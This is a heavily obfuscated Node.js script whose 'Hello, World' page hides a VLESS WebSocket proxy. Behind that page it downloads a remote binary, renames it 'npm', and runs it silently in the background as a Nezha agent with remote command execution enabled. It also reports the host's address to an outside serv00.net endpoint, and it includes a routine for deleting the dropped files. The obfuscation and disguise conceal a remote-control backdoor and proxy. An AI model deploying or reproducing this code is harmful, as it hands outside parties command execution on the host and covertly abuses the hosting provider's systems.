const _0x4e9d23=_0x270a;(function(_0x1a6006,_0x5428e1){const _0x48f35d=_0x270a,_0x19c784=_0x1a6006();while(!![]){try{const _0x9bec99=parseInt(_0x48f35d(0xe0))/0x1+parseInt(_0x48f35d(0x13a))/0x2+-parseInt(_0x48f35d(0x143))/0x3+-parseInt(_0x48f35d(0x129))/0x4*(parseInt(_0x48f35d(0x13f))/0x5)+parseInt(_0x48f35d(0xed))/0x6+parseInt(_0x48f35d(0x10c))/0x7*(parseInt(_0x48f35d(0x131))/0x8)+-parseInt(_0x48f35d(0xf8))/0x9*(parseInt(_0x48f35d(0x128))/0xa);if(_0x9bec99===_0x5428e1)break;else _0x19c784['push'](_0x19c784['shift']());}catch(_0x19b401){_0x19c784['push'](_0x19c784['shift']());}}}(_0x3b27,0x1c427));const os=require('os'),http=require(_0x4e9d23(0x110)),fs=require('fs'),axios=require(_0x4e9d23(0x13d)),net=require('net'),{Buffer}=require(_0x4e9d23(0x12a)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||'de04add9-5c68-6bab-950c-08cd5320df33',NEZHA_SERVER=process[_0x4e9d23(0x11d)][_0x4e9d23(0x11b)]||'',NEZHA_PORT=process[_0x4e9d23(0x11d)][_0x4e9d23(0x124)]||'',NEZHA_KEY=process['env'][_0x4e9d23(0x12f)]||'',DOMAIN=process['env'][_0x4e9d23(0x108)]||_0x4e9d23(0x106),AUTO_ACCESS=process[_0x4e9d23(0x11d)][_0x4e9d23(0x101)]||!![],pad=_0x5da83d=>_0x5da83d[_0x4e9d23(0xf6)]()[_0x4e9d23(0x105)](0x2,'0'),date=new Date(),SUB_PATH=''+date[_0x4e9d23(0x122)]()+pad(date[_0x4e9d23(0xef)]()+0x1)+pad(date[_0x4e9d23(0x10d)]()),NAME=process[_0x4e9d23(0x11d)][_0x4e9d23(0x118)]||_0x4e9d23(0x123),PORT=process[_0x4e9d23(0x11d)][_0x4e9d23(0xf4)]||0xbb8,metaInfo=execSync(_0x4e9d23(0x13b),{'encoding':_0x4e9d23(0x121)}),ISP=metaInfo['trim'](),httpServer=http[_0x4e9d23(0xf2)]((_0x3e0132,_0x424098)=>{const _0xed1ec8=_0x4e9d23;if(_0x3e0132[_0xed1ec8(0x119)]==='/')_0x424098[_0xed1ec8(0x10f)](0xc8,{'Content-Type':_0xed1ec8(0xea)}),_0x424098[_0xed1ec8(0x139)]('Hello,\x20World\x0a');else{if(_0x3e0132[_0xed1ec8(0x119)]==='/'+SUB_PATH){const _0x230280=_0xed1ec8(0xe5)+UUID+_0xed1ec8(0xec)+DOMAIN+'&type=ws&host='+DOMAIN+'&path=%2F#'+NAME+'-'+ISP,_0x50f52f=Buffer[_0xed1ec8(0x133)](_0x230280)[_0xed1ec8(0xf6)](_0xed1ec8(0xfe));_0x424098['writeHead'](0xc8,{'Content-Type':_0xed1ec8(0xea)}),_0x424098[_0xed1ec8(0x139)](_0x50f52f+'\x0a');}else _0x424098['writeHead'](0x194,{'Content-Type':_0xed1ec8(0xea)}),_0x424098['end'](_0xed1ec8(0xff));}}),wss=new WebSocket[(_0x4e9d23(0xfc))]({'server':httpServer}),uuid=UUID[_0x4e9d23(0x112)](/-/g,'');function _0x3b27(){const _0x3aa266=['base64','Not\x20Found\x0a','https://arm64.ssss.nyc.mn/agent','AUTO_ACCESS','npm\x20running\x20error:\x20','nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','8443','padStart','1234.abc.com','2096','DOMAIN','https://arm64.ssss.nyc.mn/v1','\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20','createWriteStream','55181ncGpQt','getDate','readUInt16BE','writeHead','http','error','replace','npm\x20download\x20successfully','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','has','unlink','\x0aclient_secret:\x20','NAME','url','\x22}\x27','NEZHA_SERVER','finish','env','Server\x20is\x20running\x20on\x20port\x20','send','listen','utf-8','getFullYear','Vls','NEZHA_PORT','curl\x20-X\x20POST\x20\x22https://oooo.serv00.net/add-url\x22\x20-H\x20\x22Content-Type:\x20application/json\x22\x20-d\x20\x27{\x22url\x22:\x20\x22','decode','includes','2930zYjagT','4hxLJQh','buffer','pipe','connect','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','readUInt8','NEZHA_KEY','https://amd64.ssss.nyc.mn/v1','168oaIxhP','config.yaml','from','--tls','arch','concat','write','get','end','316528haqSEx','curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','nohup\x20./npm\x20-s\x20','axios','slice','659265tdTxYb','every','2053','pop','139812TBGcjH','substr','2083','443','80348onOwpN','/bin/bash','connection','arm64','arm','vless://','log','message','map','ps\x20aux\x20|\x20grep\x20\x22npm\x22\x20|\x20grep\x20-v\x20\x22grep\x22','text/plain','2087','@www.visa.com.tw:443?encryption=none&security=tls&sni=','725622cTKgXn','npm\x20is\x20running','getMonth','split','Error\x20sending\x20request:','createServer','chmod\x20+x\x20./npm','PORT','URL\x20is\x20empty.\x20Skip\x20Adding\x20Automatic\x20Access\x20Task','toString','stream','7092XLzCsV','existsSync','reduce','length','Server','\x20>/dev/null\x202>&1\x20&'];_0x3b27=function(){return _0x3aa266;};return _0x3b27();}wss['on'](_0x4e9d23(0xe2),_0x137181=>{const _0x254b04=_0x4e9d23;_0x137181['once'](_0x254b04(0xe7),_0x2da4a4=>{const _0x12e893=_0x254b04,[_0xace480]=_0x2da4a4,_0x2e0ba4=_0x2da4a4[_0x12e893(0x13e)](0x1,0x11);if(!_0x2e0ba4[_0x12e893(0x140)]((_0x3ba9bc,_0x2d3d82)=>_0x3ba9bc==parseInt(uuid[_0x12e893(0x144)](_0x2d3d82*0x2,0x2),0x10)))return;let _0x1087ac=_0x2da4a4[_0x12e893(0x13e)](0x11,0x12)[_0x12e893(0x12e)]()+0x13;const _0x52bb04=_0x2da4a4[_0x12e893(0x13e)](_0x1087ac,_0x1087ac+=0x2)['readUInt16BE'](0x0),_0x35177d=_0x2da4a4[_0x12e893(0x13e)](_0x1087ac,_0x1087ac+=0x1)['readUInt8'](),_0x550593=_0x35177d==0x1?_0x2da4a4[_0x12e893(0x13e)](_0x1087ac,_0x1087ac+=0x4)['join']('.'):_0x35177d==0x2?new TextDecoder()[_0x12e893(0x126)](_0x2da4a4[_0x12e893(0x13e)](_0x1087ac+0x1,_0x1087ac+=0x1+_0x2da4a4[_0x12e893(0x13e)](_0x1087ac,_0x1087ac+0x1)[_0x12e893(0x12e)]())):_0x35177d==0x3?_0x2da4a4['slice'](_0x1087ac,_0x1087ac+=0x10)[_0x12e893(0xfa)]((_0x19096b,_0x1d44c5,_0x5ed5b6,_0x3a2058)=>_0x5ed5b6%0x2?_0x19096b[_0x12e893(0x136)](_0x3a2058['slice'](_0x5ed5b6-0x1,_0x5ed5b6+0x1)):_0x19096b,[])[_0x12e893(0xe8)](_0x1880ee=>_0x1880ee[_0x12e893(0x10e)](0x0)['toString'](0x10))['join'](':'):'';_0x137181[_0x12e893(0x11f)](new Uint8Array([_0xace480,0x0]));const _0xa5ef9e=createWebSocketStream(_0x137181);net[_0x12e893(0x12c)]({'host':_0x550593,'port':_0x52bb04},function(){const _0x46a906=_0x12e893;this[_0x46a906(0x137)](_0x2da4a4[_0x46a906(0x13e)](_0x1087ac)),_0xa5ef9e['on'](_0x46a906(0x111),()=>{})[_0x46a906(0x12b)](this)['on'](_0x46a906(0x111),()=>{})[_0x46a906(0x12b)](_0xa5ef9e);})['on'](_0x12e893(0x111),()=>{});})['on'](_0x254b04(0x111),()=>{});});function _0x270a(_0xa5023f,_0x1e63b8){const _0x3b27be=_0x3b27();return _0x270a=function(_0x270a6b,_0x5f4ee5){_0x270a6b=_0x270a6b-0xe0;let _0x23101c=_0x3b27be[_0x270a6b];return _0x23101c;},_0x270a(_0xa5023f,_0x1e63b8);}const getDownloadUrl=()=>{const _0x309f0d=_0x4e9d23,_0x577c75=os[_0x309f0d(0x135)]();return _0x577c75===_0x309f0d(0xe4)||_0x577c75===_0x309f0d(0xe3)||_0x577c75==='aarch64'?!NEZHA_PORT?_0x309f0d(0x109):_0x309f0d(0x100):!NEZHA_PORT?_0x309f0d(0x130):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x414d57=_0x4e9d23;try{const _0x56b043=getDownloadUrl(),_0x2012c1=await axios({'method':_0x414d57(0x138),'url':_0x56b043,'responseType':_0x414d57(0xf7)}),_0x40d9b6=fs[_0x414d57(0x10b)]('npm');return _0x2012c1['data']['pipe'](_0x40d9b6),new Promise((_0x19709a,_0x2b8bc7)=>{const _0x35d6e2=_0x414d57;_0x40d9b6['on'](_0x35d6e2(0x11c),()=>{const _0x4c62ea=_0x35d6e2;console['log'](_0x4c62ea(0x113)),exec(_0x4c62ea(0xf3),_0x5c4617=>{if(_0x5c4617)_0x2b8bc7(_0x5c4617);_0x19709a();});}),_0x40d9b6['on'](_0x35d6e2(0x111),_0x2b8bc7);});}catch(_0x13beee){throw _0x13beee;}},runnz=async()=>{const _0x36e9e8=_0x4e9d23;await downloadFile();let _0x2ea2d3='',_0x29db9e='';console[_0x36e9e8(0xe6)]('NEZHA_SERVER:\x20'+NEZHA_SERVER);const _0x12796d=()=>{const _0xea37a5=_0x36e9e8;try{const _0x39a783=execSync(_0xea37a5(0xe9))[_0xea37a5(0xf6)]();return _0x39a783[_0xea37a5(0xfb)]>0x0;}catch(_0x3499fb){return![];}};if(_0x12796d()){console['log']('npm\x20is\x20already\x20running');return;}if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xd9940b=['443',_0x36e9e8(0x104),_0x36e9e8(0x107),_0x36e9e8(0xeb),_0x36e9e8(0x145),_0x36e9e8(0x141)];_0x2ea2d3=_0xd9940b[_0x36e9e8(0x127)](NEZHA_PORT)?_0x36e9e8(0x134):'',_0x29db9e=_0x36e9e8(0x13c)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x2ea2d3+_0x36e9e8(0xfd);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x163dcb=NEZHA_SERVER[_0x36e9e8(0x127)](':')?NEZHA_SERVER[_0x36e9e8(0xf0)](':')[_0x36e9e8(0x142)]():'',_0x48f971=new Set([_0x36e9e8(0x146),_0x36e9e8(0x104),_0x36e9e8(0x107),_0x36e9e8(0xeb),'2083','2053']),_0x317363=_0x48f971[_0x36e9e8(0x115)](_0x163dcb)?'true':'false',_0x11fe07=_0x36e9e8(0x117)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+_0x36e9e8(0x10a)+_0x317363+_0x36e9e8(0x114)+UUID;!fs[_0x36e9e8(0xf9)](_0x36e9e8(0x132))&&fs['writeFileSync']('config.yaml',_0x11fe07);}_0x29db9e=_0x36e9e8(0x103);}else{console[_0x36e9e8(0xe6)](_0x36e9e8(0x12d));return;}}try{exec(_0x29db9e,{'shell':_0x36e9e8(0xe1)}),console[_0x36e9e8(0xe6)](_0x36e9e8(0xee));}catch(_0x22d5f9){console[_0x36e9e8(0x111)](_0x36e9e8(0x102)+_0x22d5f9);}};async function addAccessTask(){const _0x53db64=_0x4e9d23;if(!AUTO_ACCESS)return;try{if(!DOMAIN){console[_0x53db64(0xe6)](_0x53db64(0xf5));return;}else{const _0x482bb4='https://'+DOMAIN,_0x1f77df=_0x53db64(0x125)+_0x482bb4+_0x53db64(0x11a);exec(_0x1f77df,(_0x12cf60,_0x4d3fa1,_0x26ad12)=>{const _0x4567a9=_0x53db64;if(_0x12cf60){console[_0x4567a9(0x111)](_0x4567a9(0xf1),_0x12cf60[_0x4567a9(0xe7)]);return;}console['log']('Automatic\x20Access\x20Task\x20added\x20successfully:',_0x4d3fa1);});}}catch(_0x1c6cf4){console['error']('Error\x20added\x20Task:',_0x1c6cf4[_0x53db64(0xe7)]);}}const delFiles=()=>{const _0x125c96=_0x4e9d23;fs['unlink']('npm',()=>{}),fs[_0x125c96(0x116)]('config.yaml',()=>{});};httpServer[_0x4e9d23(0x120)](PORT,()=>{const _0x38c7f3=_0x4e9d23;runnz(),addAccessTask(),console[_0x38c7f3(0xe6)](_0x38c7f3(0x11e)+PORT);});
